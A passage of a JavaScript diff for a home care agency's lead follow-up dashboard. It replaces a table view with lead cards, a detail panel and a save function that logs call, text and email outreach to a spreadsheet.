-      if(!nsmIsCall||!nsm)activeAltBtns+='<button class="rb-small" style="background:var(--sky-pale);color:var(--sky-deep);border:1px solid var(--sky-mid)" onclick="event.stopPropagation();dialHCG(\''+l.phone+'\')">📞</button>';
-      if(!nsmIsSMS)activeAltBtns+='<button class="rb-small" style="background:var(--grn-pale);color:var(--grn);border:1px solid var(--grn-mid)" onclick="event.stopPropagation();openSMS('+l.ri+')">💬</button>';
-      if(!nsmIsEmail)activeAltBtns+='<button class="rb-small" style="background:var(--gold-pale);color:var(--gold);border:1px solid var(--gold-mid)" onclick="event.stopPropagation();openEmail('+l.ri+')">✉</button>';
-      btns='<div style="display:flex;flex-direction:column;gap:5px;width:160px">'
-          +'<div style="display:flex;gap:4px">'
-          +activeMainBtn
-          +'<button class="rb-sec" data-pid="'+pid+'" data-mode="update" onclick="btnClick(this,event)" style="background:var(--gold-pale);color:var(--gold);border:1.5px solid var(--gold-mid);flex:0 0 auto;padding:6px 10px;font-size:11px">✏</button>'
-          +'</div>'
-          +'<div style="display:flex;gap:4px">'
-          +activeAltBtns
-          +'<button class="rb-small" style="background:#F4EFE6;color:var(--mid);border:1px solid var(--border)" onclick="event.stopPropagation();openScript('+l.ri+')">📋</button>'
-          +'</div>'
-          +'</div>';
-    }else{
-      // Determine primary action type from sequence
-      var naType=l.na?l.na.icon:'📞';
-      var naIsCall=(naType==='📞');
-      var naIsSMS=(naType==='💬');
-      var naIsEmail=(naType==='✉');
-      // Primary action button
-      var primaryBtn='';
-      if(naIsCall){
-        primaryBtn='<button class="rb-primary" style="background:var(--sky-deep);color:#fff;border:none;width:100%" onclick="event.stopPropagation();dialHCG(\''+l.phone+'\')">📞 Call Now</button>';
-      } else if(naIsSMS){
-        primaryBtn='<button class="rb-primary" style="background:var(--grn);color:#fff;border:none;width:100%" onclick="event.stopPropagation();openSMS('+l.ri+')">💬 Send Text</button>';
-      } else {
-        primaryBtn='<button class="rb-primary" style="background:var(--gold);color:#fff;border:none;width:100%" onclick="event.stopPropagation();openEmail('+l.ri+')">✉ Send Email</button>';
-      }
-      // Other two methods (not the primary)
-      var altBtns='';
-      if(!naIsCall)altBtns+='<button class="rb-small" style="background:var(--sky-pale);color:var(--sky-deep);border:1px solid var(--sky-mid)" onclick="event.stopPropagation();dialHCG(\''+l.phone+'\')">📞 Call</button>';
-      if(!naIsSMS)altBtns+='<button class="rb-small" style="background:var(--grn-pale);color:var(--grn);border:1px solid var(--grn-mid)" onclick="event.stopPropagation();openSMS('+l.ri+')">💬 Text</button>';
-      if(!naIsEmail)altBtns+='<button class="rb-small" style="background:var(--gold-pale);color:var(--gold);border:1px solid var(--gold-mid)" onclick="event.stopPropagation();openEmail('+l.ri+')">✉ Email</button>';
-      btns='<div style="display:flex;flex-direction:column;gap:5px;width:160px">'
-          +primaryBtn
-          +'<div style="display:flex;gap:4px">'
-          +'<button class="rb-sec rb-done" data-pid="'+pid+'" data-mode="done" onclick="btnClick(this,event)" style="flex:1;background:var(--grn-pale);color:var(--grn);border:1.5px solid var(--grn-mid)">✓ Done</button>'
-          +'<button class="rb-sec rb-resp" data-pid="'+pid+'" data-mode="responded" onclick="btnClick(this,event)" style="flex:1;background:var(--sky-pale);color:var(--sky-deep);border:1.5px solid var(--sky-mid)">🤝</button>'
-          +'</div>'
-          +'<div style="display:flex;gap:4px">'
-          +altBtns
-          +'<button class="rb-small" style="background:#F4EFE6;color:var(--mid);border:1px solid var(--border)" onclick="event.stopPropagation();openScript('+l.ri+')">📋</button>'
-          +'</div>'
-          +'</div>';
-    }
-    // Build panel based on mode (rendered for all, shown/hidden by JS)
-    var soptsSel=stOpts.map(function(s){return'<option value="'+s+'"'+(s===l.status?' selected':'')+'>'+s+'</option>';}).join('');
-    var curNSM=rows[l.ri]?String(rows[l.ri][C.NSM]||'').trim():'';
-    var moptsSel=MOPS.map(function(s){return'<option value="'+s+'"'+(s&&s===curNSM?' selected':'')+'>'+(s||'— select —')+'</option>';}).join('');
-    // Update panel
-    var panelUpdate='<div class="ebanner eb-gold">✏ Update Follow-Up</div>'
-      +'<div class="egrid g4">'
-        +'<div class="ef"><label>Status</label><select class="ep-status">'+soptsSel+'</select></div>'
-        +'<div class="ef"><label>Next Follow-Up Date</label><input type="date" class="ep-fu" value="'+ds(def3)+'"></div>'
-        +'<div class="ef"><label>Method Used This Time</label><select class="ep-method">'+moptsSel+'</select></div>'
-        +'<div class="ef"><label>Next Suggested Method</label><select class="ep-nsm"><option value="">— select —</option>'+MOPS.slice(1).map(function(s){return'<option>'+s+'</option>';}).join('')+'</select></div>'
-      +'</div>'
-      +'<div class="ef" style="margin-bottom:14px"><label>Notes</label><textarea class="ep-notes">'+( l.notes||'')+'</textarea></div>';
-    // Done panel — just asks for method
-    var recMethod=l.na?(l.na.text&&l.na.text.toLowerCase().indexOf('call')>-1?'Phone call':l.na.text&&l.na.text.toLowerCase().indexOf('text')>-1?'SMS':l.na.text&&l.na.text.toLowerCase().indexOf('email')>-1?'Email':'Phone call'):'';
-    var doneMOpts=MOPS.map(function(s){return'<option value="'+s+'"'+(s&&s===recMethod?' selected':'')+'>'+(s||'— select —')+'</option>';}).join('');
-    panelDone='<div class="ebanner eb-grn">✓ Log Completed Action</div>'
-      +'<div class="egrid g2">'
-        +'<div class="ef"><label>Contact Method Used</label><select class="ep-method-done">'+doneMOpts+'</select></div>'
-        +'<div class="ef"><label>Action Completed</label><input type="text" class="ep-act-done" value="'+(l.na?l.na.text.replace(/"/g,'&quot;'):'')+'" readonly></div>'
-      +'</div>';
-    // Responded panel — full info
-    var svOpts='<option value="">— select —</option>'+(window._services||[]).map(function(s){return'<option>'+s+'</option>';}).join('');
-    panelResp='<div class="ebanner eb-sky">🤝 First Contact — Log Conversation</div>'
-      +'<div class="egrid g4">'
-        +'<div class="ef"><label>Response Method</label><select class="ep-resp-method">'+moptsSel+'</select></div>'
-        +'<div class="ef"><label>Date &amp; Time</label><input type="text" disabled value="'+new Date().toLocaleString('en-US',{month:'short',day:'numeric',hour:'numeric',minute:'2-digit'})+'"></div>'
-        +'<div class="ef"><label>Decision Maker Name</label><input type="text" class="ep-resp-dm" placeholder="Who did you speak with?"></div>'
-        +'<div class="ef"><label>Relationship to Client</label><input type="text" class="ep-resp-rel" placeholder="Son, daughter, spouse…"></div>'
-      +'</div>'
-      +'<div class="egrid g4">'
-        +'<div class="ef"><label>Monthly Budget</label><input type="text" class="ep-resp-budget" placeholder="$1,500/mo, flexible…"></div>'
-        +'<div class="ef"><label>Hours / Week Needed</label><input type="text" class="ep-resp-hrs" placeholder="20 hrs, full-time…"></div>'
-        +'<div class="ef"><label>Est. Start Date</label><input type="date" class="ep-resp-start"></div>'
-        +'<div class="ef"><label>Urgency Level</label><select class="ep-resp-urgency"><option value="">— select —</option><option>ASAP — within days</option><option>Within 2 weeks</option><option>Within a month</option><option>Just exploring</option></select></div>'
-      +'</div>'
-      +'<div class="egrid g3">'
-        +'<div class="ef"><label>Type of Care Needed</label><select class="ep-resp-needs">'+svOpts+'</select></div>'
-        +'<div class="ef"><label>Safety Concerns</label><input type="text" class="ep-resp-safety" placeholder="Fall risk, alone at home…"></div>'
-        +'<div class="ef"><label>Pay Type</label><select class="ep-resp-pay"><option value="">— select —</option><option>Private Pay</option><option>Medicaid / PASSPORT</option><option>Long-Term Care Insurance</option><option>VA Benefits</option><option>Unknown</option></select></div>'
-      +'</div>'
-      +'<div class="egrid g2">'
-        +'<div class="ef"><label>Next Follow-Up Date</label><input type="date" class="ep-resp-fu" value="'+ds(def3)+'"></div>'
-        +'<div class="ef"><label>Next Follow-Up Method</label><select class="ep-resp-next-method"><option value="">— select —</option>'+MOPS.slice(1).map(function(s){return'<option>'+s+'</option>';}).join('')+'</select></div>'
-      +'</div>'
-      +'<div class="ef" style="margin-bottom:14px"><label>Conversation Notes</label><textarea class="ep-resp-notes" placeholder="Key details, concerns, what they said, next steps…"></textarea></div>';
-    rowHtml='<tr class="dr'+(drawerRi===l.ri?' sel':'')+'" onclick="openDrawer('+l.ri+');hlRow(this)">'
-      +'<td><div class="tn">'+l.name+'</div><div class="ts">'+(l.dm||'')+'</div></td>'
-      +'<td><div class="tc2">'+(ph||'')+( em||'')+(!ph&&!em?'<span style="color:var(--soft);font-size:12px">—</span>':'')+'</div></td>'
-      +'<td>'+sbadge(l.status)+'</td>'
-      +'<td>'+pill+'<br><span style="font-size:11px;color:var(--soft)">'+fuD+'</span></td>'
-      +'<td><div class="spill">'+l.seqLbl+'</div>'+naHtml+'</td>'
-      +'<td><div class="rbtns">'+btns+'</div></td>'
-      +'</tr>'
-      +'<tr class="pr" id="'+pid+'-row" style="display:none"><td colspan="6" style="padding:0">'
-        +'<div class="ep" id="'+pid+'">'
-          +'<div class="epi">'
-            +'<div class="etitle">'+l.name+'</div>'
-            +'<div id="'+pid+'-body"></div>'
-            +'<div class="eacts">'
-              +'<button class="esave" data-ri="'+l.ri+'" data-pid="'+pid+'" onclick="saveEp(parseInt(this.dataset.ri),this.dataset.pid)">Save to Sheet</button>'
-              +'<button class="ecancel" data-pid="'+pid+'" onclick="closeEp(this.dataset.pid)">Cancel</button>'
-              +'<div class="esaving"><div class="mspin"></div> Saving…</div>'
-            +'</div>'
-          +'</div>'
-        +'</div>'
-      +'</td></tr>'
-      ;
-    window['_pd'+pid]={update:panelUpdate,done:panelDone,responded:panelResp};
-    return rowHtml;
+  od.sort(sortByFu);
+  td2.sort(sortByFu);
+  wk.sort(sortByFu);
+  allL.sort(sortByFu);
+
+  /* KPI */
+  setText('kv0', od.length);
+  setText('kv1', td2.length);
+  setText('kv2', wk.length);
+  setText('kv3', totalNames.length);
+  show('kbar', 'grid');
+
+  /* Sections */
+  renderSection('t-od',  'c-od',  od,   'od',  tMs);
+  renderSection('t-td',  'c-td',  td2,  'td',  tMs);
+  renderSection('t-wk',  'c-wk',  wk,   'wk',  tMs);
+  renderSection('t-all', 'c-all', allL, 'all', tMs);
+
+  el('main').classList.add('vis');
+}
+
+/* ────────────────────────────────────────────────────────────────────
+   RENDER SECTION
+──────────────────────────────────────────────────────────────────── */
+function renderSection(tId, cId, leads, type, tMs) {
+  var n = leads.length;
+  setText(cId, n + ' lead' + (n !== 1 ? 's' : ''));
+  var container = el(tId);
+  if (!container) return;
+  if (!n) {
+    var msgs = {od:'No overdue follow-ups — great work!', td:'Nothing due today.', wk:'No follow-ups this week.', all:'No active leads.'};
+    container.innerHTML = '<div class="sec-empty">' + (msgs[type] || '') + '</div>';
+    return;
+  }
+  container.innerHTML = leads.map(function(lead) {
+    return buildCard(lead, type, tMs);
   }).join('');
-  return'<table><thead><tr><th>Client</th><th>Phone / Email</th><th>Status</th><th>Follow-Up</th><th>Sequence</th><th></th></tr></thead><tbody>'+rhtml+'</tbody></table>';
 }
 
-function btnClick(btn,e){
-  if(e)e.stopPropagation();
-  var pid=btn.dataset.pid,mode=btn.dataset.mode;
-  if(pid&&mode)openEp(pid,mode,e);
-}
-function openEp(pid,mode,e){
-  if(e)e.stopPropagation();
-  // Close all others
-  document.querySelectorAll('.ep.open').forEach(function(p){
-    if(p.id!==pid){p.classList.remove('open','ep-update','ep-done','ep-resp');var r=el(p.id+'-row');if(r)r.style.display='none';var b=el(p.id+'-btn');if(b)b.classList.remove('on');}
-  });
-  var ep=el(pid),row=el(pid+'-row'),btn=el(pid+'-btn');
-  if(!ep||!row)return;
-  // If clicking same mode that's already open, close it
-  if(ep.classList.contains('open')&&ep.dataset.mode===mode){closeEp(pid);return;}
-  // Set panel content
-  var pd2=window['_pd'+pid];
-  if(!pd2)return;
-  var body=el(pid+'-body');
-  if(body)body.innerHTML=pd2[mode]||'';
-  ep.className='ep open ep-'+mode;
-  ep.dataset.mode=mode;
-  row.style.display='table-row';
-  if(btn)btn.classList.toggle('on',mode==='update');
-}
-function closeEp(pid){
-  var ep=el(pid),row=el(pid+'-row'),btn=el(pid+'-btn');
-  if(ep){ep.classList.remove('open','ep-update','ep-done','ep-resp');}
-  if(row)row.style.display='none';
-  if(btn)btn.classList.remove('on');
-}
-function setSaving(pid,on){
-  var p=el(pid);if(!p)return;
-  var sv=p.querySelector('.esaving');if(sv)sv.classList.toggle('on',on);
-  p.querySelectorAll('.esave,.ecancel').forEach(function(b){b.disabled=on;});
+/* ────────────────────────────────────────────────────────────────────
+   BUILD CARD
+──────────────────────────────────────────────────────────────────── */
+function buildCard(lead, type, tMs) {
+  var fMs = lead.fu ? lead.fu.getTime() : null;
+
+  /* Urgency pill */
+  var pill = '';
+  if (!fMs) {
+    pill = '<span class="card-pill pill-none">No date set</span>';
+  } else if (fMs < tMs) {
+    var dOvr = Math.round((tMs - fMs) / 86400000);
+    pill = '<span class="card-pill pill-od">' + dOvr + 'd overdue</span>';
+  } else if (fMs === tMs) {
+    pill = '<span class="card-pill pill-td">Due today</span>';
+  } else {
+    var dIn = Math.round((fMs - tMs) / 86400000);
+    pill = '<span class="card-pill pill-wk">in ' + dIn + 'd</span>';
+  }
+
+  /* Next action text */
+  var nxtHtml = lead.na
+    ? '<span class="card-nxt">' + lead.na.icon + ' ' + escHtml(lead.na.text) + '</span>'
+    : (lead.active
+        ? '<span class="card-nxt" style="color:var(--grn)">✓ Active — check in</span>'
+        : '<span class="card-nxt" style="color:var(--soft)">Sequence complete</span>');
+
+  /* Primary CTA */
+  var cta = buildCTA(lead);
+
+  /* Status badge */
+  var badge = buildBadge(lead.status);
+
+  /* Contact links */
+  var ph = lead.phone
+    ? '<a class="c-link" href="#" onclick="event.preventDefault();event.stopPropagation();dialHCG(\'' + escAttr(lead.phone) + '\')" >' +
+      '📞 ' + escHtml(lead.phone) + '</a>'
+    : '';
+  var em = lead.email
+    ? '<a class="c-link c-link-em" href="mailto:' + escAttr(lead.email) + '" onclick="event.stopPropagation()">' +
+      '✉ ' + escHtml(lead.email) + '</a>'
+    : '';
+
+  /* Urgency class */
+  var urgClass = '';
+  if (fMs && fMs < tMs) urgClass = ' urgency-od';
+  else if (fMs && fMs === tMs) urgClass = ' urgency-td';
+
+  return '<div class="lead-card' + urgClass + '" id="card-' + lead.ri + '" onclick="openPanel(' + lead.ri + ')">' +
+    '<div class="card-body">' +
+      '<div class="card-row1">' +
+        '<span class="card-name">' + escHtml(lead.name) + '</span>' +
+        badge +
+      '</div>' +
+      (ph || em
+        ? '<div class="card-row2">' + ph + em + '</div>'
+        : '') +
+      '<div class="card-row3">' +
+        pill +
+        nxtHtml +
+        cta +
+      '</div>' +
+    '</div>' +
+  '</div>';
 }
 
-async function saveEp(ri,pid){
-  var ep=el(pid);if(!ep)return;
-  var mode=ep.dataset.mode,today=fd2(new Date()),u={};
-  setSaving(pid,true);
-  try{
-    if(mode==='update'){
-      var st=ep.querySelector('.ep-status');if(st&&st.value)u[C.ST]=st.value;
-      var fu=ep.querySelector('.ep-fu');if(fu&&fu.value)u[C.NF]=fu.value;
-      var mt=ep.querySelector('.ep-method');if(mt&&mt.value)u[C.MT]=mt.value;
-      var nsm2=ep.querySelector('.ep-nsm');if(nsm2&&nsm2.value)u[C.NSM]=nsm2.value;
-      var nt=ep.querySelector('.ep-notes');if(nt)u[C.NT]=nt.value;
-      if(mt&&mt.value||fu&&fu.value)u[C.LC]=today;
-    } else if(mode==='done'){
-      var mt2=ep.querySelector('.ep-method-done');if(mt2&&mt2.value)u[C.MT]=mt2.value;
-      var act=ep.querySelector('.ep-act-done');
-      var actText=act?act.value:'Action logged';
-      // Append to existing log rather than overwrite — keeps AM when PM is logged
-      var existingLog=rows[ri]?String(rows[ri][C.SL]||''):'';
-      var newLog=existingLog?existingLog+' | '+actText:actText;
-      // Keep only last 20 entries to avoid infinite growth
-      var parts=newLog.split(' | ');
-      if(parts.length>20)parts=parts.slice(parts.length-20);
-      u[C.SL]=parts.join(' | ');
-      u[C.SD]=today;u[C.LC]=today;
-    } else if(mode==='responded'){
-    var rm=ep.querySelector('.ep-resp-method');if(rm&&rm.value)u[C.MT]=rm.value;
-    var rfu=ep.querySelector('.ep-resp-fu');if(rfu&&rfu.value)u[C.NF]=rfu.value;
-    var rdm=ep.querySelector('.ep-resp-dm');if(rdm&&rdm.value)u[C.DM]=rdm.value;
-    var rhrs=ep.querySelector('.ep-resp-hrs');if(rhrs&&rhrs.value)u[C.HR]=rhrs.value;
-    var rstart=ep.querySelector('.ep-resp-start');if(rstart&&rstart.value)u[C.ES]=rstart.value;
-    var rpay=ep.querySelector('.ep-resp-pay');if(rpay&&rpay.value)u[C.PT]=rpay.value;
-    var rnt=ep.querySelector('.ep-resp-notes');
-    var rbudget=ep.querySelector('.ep-resp-budget');
-    var rurgency=ep.querySelector('.ep-resp-urgency');
-    var rneeds=ep.querySelector('.ep-resp-needs');
-    var rsafety=ep.querySelector('.ep-resp-safety');
-    var np=[];
-    if(rnt&&rnt.value)np.push(rnt.value);
-    if(rbudget&&rbudget.value)np.push('Budget: '+rbudget.value);
-    if(rurgency&&rurgency.value)np.push('Urgency: '+rurgency.value);
-    if(rneeds&&rneeds.value)np.push('Care needs: '+rneeds.value);
-    if(rsafety&&rsafety.value)np.push('Safety: '+rsafety.value);
-    if(np.length)u[C.NT]=np.join(' | ');
-    u[C.SL]='First contact logged';u[C.ST]='Active Conversation';u[C.LC]=today;u[C.SD]=today;
+function buildCTA(lead) {
+  var nsm = lead.nsm.toLowerCase();
+  var isCall  = nsm.indexOf('phone') > -1 || nsm.indexOf('call') > -1;
+  var isSMS   = nsm.indexOf('sms') > -1 || nsm.indexOf('text') > -1;
+  var isEmail = nsm.indexOf('email') > -1;
+
+  /* For non-active leads, use the next action icon to decide */
+  if (!lead.active && lead.na) {
+    if (lead.na.icon === '💬') isSMS = true;
+    else if (lead.na.icon === '📞') isCall = true;
+    else if (lead.na.icon === '✉') isEmail = true;
+  }
+
+  if (isCall || (!isSMS && !isEmail && !lead.active)) {
+    return '<button class="card-cta cta-call" onclick="event.stopPropagation();dialHCG(\'' + escAttr(lead.phone) + '\')">📞 Call</button>';
+  } else if (isSMS) {
+    return '<button class="card-cta cta-sms" onclick="event.stopPropagation();openSMS(' + lead.ri + ')">💬 Text</button>';
+  } else if (isEmail) {
+    return '<button class="card-cta cta-email" onclick="event.stopPropagation();openEmail(' + lead.ri + ')">✉ Email</button>';
+  } else {
+    return '<button class="card-cta cta-update" onclick="event.stopPropagation();openPanel(' + lead.ri + ')">✏ Update</button>';
+  }
+}
+
+function buildBadge(st) {
+  var sl = st.toLowerCase();
+  var cls = 'b-other';
+  if (sl.indexOf('new') > -1)             cls = 'b-new';
+  else if (sl.indexOf('no answer') > -1)  cls = 'b-noans';
+  else if (sl.indexOf('active conv') > -1) cls = 'b-active';
+  else if (sl.indexOf('contacted') > -1)  cls = 'b-contacted';
+  else if (sl.indexOf('assessment') > -1) cls = 'b-assess';
+  else if (sl.indexOf('proposal') > -1)   cls = 'b-proposal';
+  else if (sl.indexOf('negotiat') > -1)   cls = 'b-neg';
+  return '<span class="badge ' + cls + '">' + escHtml(st) + '</span>';
+}
+
+/* ────────────────────────────────────────────────────────────────────
+   DETAIL PANEL
+──────────────────────────────────────────────────────────────────── */
+function openPanel(ri) {
+  /* Find the lead object */
+  var lead = null;
+  var allLeads = getAllLeads();
+  for (var i = 0; i < allLeads.length; i++) {
+    if (allLeads[i].ri === ri) { lead = allLeads[i]; break; }
+  }
+  if (!lead && rows[ri]) {
+    /* Rebuild minimal lead from row if not in allLeads (e.g. excluded status) */
+    lead = rowToLead(ri);
+  }
+  if (!lead) return;
+
+  panelRi = ri;
+
+  /* Highlight selected card */
+  document.querySelectorAll('.lead-card').forEach(function(c) { c.classList.remove('sel'); });
+  var card = el('card-' + ri);
+  if (card) card.classList.add('sel');
+
+  /* Header */
+  setText('panel-name', lead.name);
+  setText('panel-meta', lead.phaseLabel + (lead.status ? ' · ' + lead.status : ''));
+
+  /* Body */
+  el('panel-body').innerHTML = buildPanelBody(lead);
+
+  /* Open */
+  el('panel').classList.add('open');
+  el('page').classList.add('panel-open');
+}
+
+function closePanel() {
+  panelRi = null;
+  el('panel').classList.remove('open');
+  el('page').classList.remove('panel-open');
+  document.querySelectorAll('.lead-card').forEach(function(c) { c.classList.remove('sel'); });
+}
+
+function buildPanelBody(lead) {
+  var html = '';
+
+  /* ── Next Action ── */
+  html += '<div class="panel-section">';
+  html += '<div class="panel-sec-lbl">Next Action</div>';
+  if (lead.na) {
+    var isOd = lead.fu && lead.fu.getTime() < new Date().setHours(0,0,0,0);
+    html += '<div class="nxt-box">';
+    html += '<div class="nxt-step">' + lead.na.icon + ' ' + escHtml(lead.na.text) + '</div>';
+    if (lead.fuStr) {
+      html += '<div class="nxt-urgency' + (isOd ? ' od' : '') + '">';
+      html += isOd ? '⚠ Overdue since ' + fmtDate(lead.fu) : 'Due: ' + fmtDate(lead.fu);
+      html += '</div>';
     }
-    if(Object.keys(u).length===0){closeEp(pid);setSaving(pid,false);return;}
-    await writeRow(ri,u);
-    closeEp(pid);
-    toast('✓ Saved');
-    setTimeout(loadData,700);
-  }catch(e){
+    html += '</div>';
+  } else if (lead.active) {
+    html += '<div class="nxt-box"><div class="nxt-step">✓ Active lead — check in as needed</div></div>';
+  } else {
+    html += '<div class="nxt-box"><div class="nxt-complete">Sequence complete — nurture as needed</div></div>';
+  }
+  html += '<div class="pact-row">';
+  if (lead.phone) {
+    html += '<button class="pact pact-call" onclick="dialHCG(\'' + escAttr(lead.phone) + '\')">📞 Call via HomeCareGrow</button>';
+  }
+  html += '<button class="pact pact-sms" onclick="openSMS(' + lead.ri + ')">💬 Send SMS</button>';
+  if (lead.email) {
+    html += '<button class="pact pact-email" onclick="openEmail(' + lead.ri + ')">✉ Send Email</button>';
+  }
+  html += '<button class="pact pact-script" onclick="openScript(' + lead.ri + ')">📋 View Call Script</button>';
+  html += '</div>';
+  html += '</div>';
+
+  /* ── Log Outcome ── */
+  html += '<div class="panel-section">';
+  html += '<div class="panel-sec-lbl">Log Outcome</div>';
+  html += '<div class="log-form">';
+  html += '<div class="lf-field"><label class="lf-label">What happened?</label>';
+  html += '<select class="lf-select" id="lf-action">';
+  html += '<option value="">— select —</option>';
+  html += '<option>Left voicemail</option>';
+  html += '<option>No answer — will try again</option>';
+  html += '<option>Spoke with lead</option>';
+  html += '<option>Sent intro text</option>';
+  html += '<option>Sent first call</option>';
+  html += '<option>Sent second call</option>';
+  html += '<option>Sent missed-you text</option>';
+  html += '<option>AM Call — Day ' + (countAMCalls(lead) + 1) + '</option>';
+  html += '<option>PM Call — Day ' + (countAMCalls(lead) + 1) + '</option>';
+  html += '<option>PM Text — Day ' + (countAMCalls(lead) + 1) + '</option>';
+  html += '<option>Week ' + (countWeeklies(lead) + 1) + ' outreach</option>';
+  html += '<option>Re-engagement call</option>';
+  html += '<option>Left voicemail — re-engagement</option>';
+  html += '<option>Email sent</option>';
+  html += '<option>Meeting / assessment scheduled</option>';
+  html += '</select></div>';
+
+  html += '<div class="lf-field"><label class="lf-label">Update status</label>';
+  html += '<select class="lf-select" id="lf-status">';
+  html += '<option value="">— no change —</option>';
+  stOpts.forEach(function(s) {
+    html += '<option' + (s === lead.status ? ' selected' : '') + '>' + escHtml(s) + '</option>';
+  });
+  html += '</select></div>';
+
+  html += '<div class="lf-field"><label class="lf-label">Next follow-up date</label>';
+  html += '<input class="lf-input" type="date" id="lf-fu" value="' + (lead.fuStr || '') + '"></div>';
+
+  html += '<div class="lf-field"><label class="lf-label">Notes</label>';
+  html += '<textarea class="lf-textarea" id="lf-notes" placeholder="Quick note…"></textarea></div>';
+
+  html += '<button class="lf-save" id="lf-save-btn" onclick="saveLog(' + lead.ri + ')">';
+  html += '<div class="lf-spin" id="lf-spin"></div>Save & Update</button>';
+  html += '</div>';
+  html += '</div>';
+
+  /* ── Contact Info ── */
+  html += '<div class="panel-section">';
+  html += '<div class="panel-sec-lbl">Contact Info</div>';
+  var details = [
+    ['Phone',    lead.phone ? '<a href="tel:' + escAttr(lead.phone) + '" style="color:var(--sky)">' + escHtml(lead.phone) + '</a>' : '—'],
+    ['Email',    lead.email ? '<a href="mailto:' + escAttr(lead.email) + '" style="color:var(--grn)">' + escHtml(lead.email) + '</a>' : '—'],
+    ['Area',     lead.area     || '—'],
+    ['Source',   lead.source   || '—'],
+    ['Services', lead.services || '—'],
+    ['Decision Maker', lead.dm || '—'],
+    ['Pay Type', lead.payType  || '—'],
+    ['Move-in',  lead.moveIn   || '—'],
+    ['Agreement',lead.agreed   || '—'],
+    ['Safety',   lead.safety   || '—'],
+    ['Relationship', lead.rel  || '—'],
+    ['Days in pipeline', lead.daysOld + 'd']
+  ];
+  details.forEach(function(d) {
+    if (!d[1] || d[1] === '—') return;
+    html += '<div class="detail-row"><span class="detail-key">' + d[0] + '</span><span class="detail-val">' + d[1] + '</span></div>';
+  });
+  html += '</div>';
+
+  /* ── Notes ── */
+  if (lead.notes) {
+    html += '<div class="panel-section">';
+    html += '<div class="panel-sec-lbl">Notes</div>';
+    html += '<div class="notes-box">' + escHtml(lead.notes) + '</div>';
+    html += '</div>';
+  }
+
+  /* ── Sequence Log ── */
+  if (lead.seqLast) {
+    html += '<div class="panel-section">';
+    html += '<div class="panel-sec-lbl">Activity Log</div>';
+    var logEntries = lead.seqLast.split('|').map(function(s) { return s.trim(); }).filter(Boolean);
+    html += '<div class="seq-log">';
+    logEntries.slice().reverse().forEach(function(entry) {
+      html += '<div class="seq-log-item"><div class="seq-log-dot"></div><div>' + escHtml(entry) + '</div></div>';
+    });
+    html += '</div>';
+    html += '</div>';
+  }
+
+  return html;
+}
+
+/* ── Log helper counts ── */
+function countAMCalls(lead) {
+  var log = lead.seqLast || '';
+  return log.split('|').filter(function(e) { return e.toLowerCase().indexOf('am call') > -1; }).length;
+}
+function countWeeklies(lead) {
+  var log = lead.seqLast || '';
+  return log.split('|').filter(function(e) {
+    return e.toLowerCase().indexOf('week') > -1 || e.toLowerCase().indexOf('nurture') > -1;
+  }).length;
+}
+
+/* ────────────────────────────────────────────────────────────────────
+   SAVE LOG
+──────────────────────────────────────────────────────────────────── */
+async function saveLog(ri) {
+  var actionEl = el('lf-action');
+  var statusEl = el('lf-status');
+  var fuEl     = el('lf-fu');
+  var notesEl  = el('lf-notes');
+  var saveBtn  = el('lf-save-btn');
+  var spinEl   = el('lf-spin');
+
+  var actionVal = actionEl ? actionEl.value.trim() : '';
+  var statusVal = statusEl ? statusEl.value.trim() : '';
+  var fuVal     = fuEl     ? fuEl.value.trim()     : '';
+  var notesVal  = notesEl  ? notesEl.value.trim()  : '';
+
+  if (!actionVal && !statusVal && !fuVal && !notesVal) {
+    toast('Nothing to save — fill in at least one field.');
+    return;
+  }
+
+  if (saveBtn) saveBtn.disabled = true;
+  if (spinEl)  spinEl.classList.add('on');
+
+  try {
+    var updates = {};
+    var r = rows[ri];
+
+    /* Append to sequence log */
+    if (actionVal) {
+      var existLog = String(r[C.SL] || '').trim();
+      var newLog = existLog ? existLog + ' | ' + actionVal : actionVal;
+      updates[C.SL] = newLog;
+    }
+    /* Status */
+    if (statusVal) updates[C.ST] = statusVal;
+    /* Next follow-up date */
+    if (fuVal) updates[C.NF] = fuVal;
+    /* Notes — append, don't overwrite */
+    if (notesVal) {
+      var existNotes = String(r[C.NT] || '').trim();
+      var today = new Date().toLocaleDateString('en-US',{month:'short',day:'numeric'});
+      updates[C.NT] = existNotes ? existNotes + '\n' + today + ': ' + notesVal : today + ': ' + notesVal;
+    }
+
+    await writeRow(ri, updates);
+
+    /* Update local rows */
+    if (updates[C.SL] !== undefined) r[C.SL] = updates[C.SL];
+    if (updates[C.ST] !== undefined) r[C.ST] = updates[C.ST];
+    if (updates[C.NF] !== undefined) r[C.NF] = updates[C.NF];
+    if (updates[C.NT] !== undefined) r[C.NT] = updates[C.NT];
+
+    toast('Saved ✓');
+    await loadData();
+  } catch(e) {
     showErr(e.message);
-  }finally{
-    setSaving(pid,false);
+  } finally {
+    if (saveBtn) saveBtn.disabled = false;
+    if (spinEl)  spinEl.classList.remove('on');
   }
 }
 
-// Drawer
-function openDrawer(ri){
-  drawerRi=ri;
-  var r=rows[ri];if(!r)return;
-  function v(col){var val=r[col];return(val!==undefined&&val!==null&&val!=='')? String(val):null;}
-  el('dname').textContent=v(C.NM)||'—';
-  el('dstatus').innerHTML=sbadge(v(C.ST)||'');
-  function drow(lbl,val,type){
-    if(!val)return'';
-    var disp=type==='ph'?'<a href="#" onclick="event.preventDefault();window.open(\'https://app.homecaregrow.io/v2/location/kWlzzI2WZaes2GnQf7DV/contacts\',\'hcg\',\'width=1100,height=750,noopener\')">'+val+'</a>'
-            :type==='em'?'<a class="em" href="mailto:'+val+'">'+val+'</a>':val;
-    return'<div class="drow"><span class="dlbl">'+lbl+'</span><span class="dval">'+disp+'</span></div>';
-  }
-  var da=pd(v(C.DA)),dO=da?Math.max(0,Math.round((new Date(ds(new Date()))-new Date(ds(da)))/86400000)):0;
-  var si=seqP(dO);
-  el('dbody').innerHTML=
-    '<div class="dsec"><div class="dsect">Sequence</div><div class="dphase">'+si.lbl+' · Day '+dO+'</div></div>'
-    +'<div class="dsec"><div class="dsect">Contact</div>'
-    +drow('Phone',v(C.PH),'ph')+drow('Email',v(C.EM),'em')
-    +drow('Area / City',v(C.AR))+drow('Decision Maker',v(C.DM))+'</div>'
-    +'<div class="dsec"><div class="dsect">Lead Details</div>'
-    +drow('Date Added',v(C.DA))+drow('Referral Source',v(C.SO))
-    +drow('Services',v(C.SV))+drow('Hrs / Week',v(C.HR)?v(C.HR)+' hrs':null)
-    +drow('Est. Start',v(C.ES))+drow('Pay Type',v(C.PT))
-    +drow('Monthly Value',v(C.MV)?'$'+Number(v(C.MV).replace(/[^0-9.]/g,'')).toLocaleString():null)
